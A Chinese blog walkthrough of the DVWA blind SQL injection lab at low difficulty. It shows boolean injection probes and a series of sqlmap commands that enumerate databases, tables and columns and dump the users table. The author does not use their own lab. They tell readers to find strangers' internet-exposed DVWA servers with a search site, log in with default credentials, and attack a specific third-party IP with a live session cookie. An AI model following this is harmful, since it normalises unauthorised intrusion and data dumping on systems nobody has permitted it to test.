# 【渗透整理】DVWA SQL Injection (Blind) —等级：low

DVWA可以自己搭建在本地主机进行学习测试（burp  suite本地抓包的时候需要把127.0.0.1的默认不截取取消，否则自己抓不到自己，踩坑铭记），如果不想麻烦的话可以直接网上搜索人家搭建好的DVWA平台来使用，省时省力，还能看见很多的“道友”遗留的痕迹。

## 1、寻找测试主机：

网站 fafo.so 打开搜索DVWA即可，可以看到很多200OK的主机都可以访问，复制他们的ip直接浏览器打开即可，DVWA的默认用户密码admin，password
 【图 挑一台测试主机】
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224105358634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

## 2、登录DVWA，调整等级low，进入 SQL Injection (Blind)，开始游戏

- 测试注入点 （我们已经知道是盲注，体验一下流程就行了）
- 测试闭合方式（虽然sqlmap可以直接完成，但我还是说一下吧，这是难点）
   1、1 and 1=1 #  回显：User ID exists in the database.【第一个“1”是ID用，“1=1”是用来判断的，#是注释符（–+也行）】
   2、1 and 1=2 # 回显：User ID exists in the database.【1=2是永假条件，永假条件和1、的永真条件1=1的回显一样，说明纯数字 1 的闭合方式错误】
   3、1’ and 1=1 # 回显：User ID exists in the database.
   4、1’ and 1=2 #  回显：User ID is MISSING from the database.【相同的闭合方式1’，永真条件1=1显示exists，永假条件显示MISSING，说明 1’ 的闭合方式正确，下面开始使用这个闭合方式注入】
   sql盲注比较头疼的就是你得一个一个的猜测数据库中所有信息名称的字母，26个字母再分大小写52个ASCII码值猜完才知道一个字母，手工操作繁琐至极，所以这里我采用sqlmap替代手工[(手工原理戳这里)](https://www.jianshu.com/p/757626cec742)
- 下面是sqlmap的盲注过程

```
1、运行sqlmap，常规尝试：失败
D:\sqlmap2>python2 sqlmap.py -u "http://106.75.79.26/vulnerabilities/sqli_blind/?id=3 
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224112244301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 sqlmap 回显302拒绝，猜测可能需要cookie，于是指定参数cookie再试
 == 我原本讲就装了Cookie Editor插件，可以直接获取cookie值，附在参数位置就可以，没有的话可以抓个包cookie就有了==

```
2、运行sqlmap，参数cookie：成功
D:\sqlmap2>python2 sqlmap.py -u "http://106.75.79.26/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=a5vf78oqfkn2t3ektqh7rh0dm7; security=low"
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224112337621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224112601901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)
 然后就是走流程了

```
3、爆库
D:\sqlmap2>python2 sqlmap.py -u "http://106.75.79.26/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=a5vf78oqfkn2t3ektqh7rh0dm7; security=low" --dbs
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224112531159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224112733757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

```
4、爆表
D:\sqlmap2>python2 sqlmap.py -u "http://106.75.79.26/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=a5vf78oqfkn2t3ektqh7rh0dm7; security=low" --tables -D dvwa
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019122411282924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224112844356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

```
5、爆字段
D:\sqlmap2>python2 sqlmap.py -u "http://106.75.79.26/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=a5vf78oqfkn2t3ektqh7rh0dm7; security=low" --columns -T users
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224113009514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224113021523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)

```
6、爆表的内容
D:\sqlmap2>python2 sqlmap.py -u "http://106.75.79.26/vulnerabilities/sqli_blind/?id=3&Submit=Submit" --cookie="PHPSESSID=a5vf78oqfkn2t3ektqh7rh0dm7; security=low" -T users --dump
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224113204200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224113215527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)![在这里插入图片描述](https://img-blog.csdnimg.cn/20191224113229689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc0MjY1OA==,size_16,color_FFFFFF,t_70)内容全出，游戏结束

## 3、总结

sqlmap的功能强大，使用技巧后期需要自己复习或者恶补，初级的难度很菜，以前做了没有时间整理，现在码在这记录一下。 平安夜有人陪，有苹果吃就很开心。